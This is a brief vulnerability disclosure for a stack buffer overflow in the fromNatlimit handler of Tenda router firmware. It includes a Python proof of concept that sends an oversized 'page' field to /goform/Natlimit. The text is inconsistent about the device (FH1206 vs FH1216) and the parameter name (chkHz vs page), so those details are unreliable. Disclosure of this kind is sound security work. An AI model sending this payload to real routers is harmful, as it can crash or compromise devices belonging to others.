# fromNatlimit

## Overview

- Firmware download website: https://www.tendacn.com/hk/download/detail-2344.html

## Affected version

FH1206 V1.2.0.8(8155)_EN

## Vulnerability details

There is a stack buffer overflow vulnerability in Tenda FH1216 V1.2.0.8(8155)_EN, located in the **fromNatlimit** function. The function receives the `chkHz` parameter from a POST request. `   sprintf(v4, "lan_controllist.asp?page=%s", v2);` The statement will cause a buffer overflow. The `page` value provided by the user may exceed the capacity of the `v4` array, thereby triggering this security vulnerability.

![image](https://github.com/user-attachments/assets/7a84529f-7a8a-44e0-bf6e-fc70203d573a)


## POC

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/Natlimit"
payload = b"a"*2000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image](https://github.com/user-attachments/assets/e2e5f88e-99fe-4de0-8113-814f628d02bd)
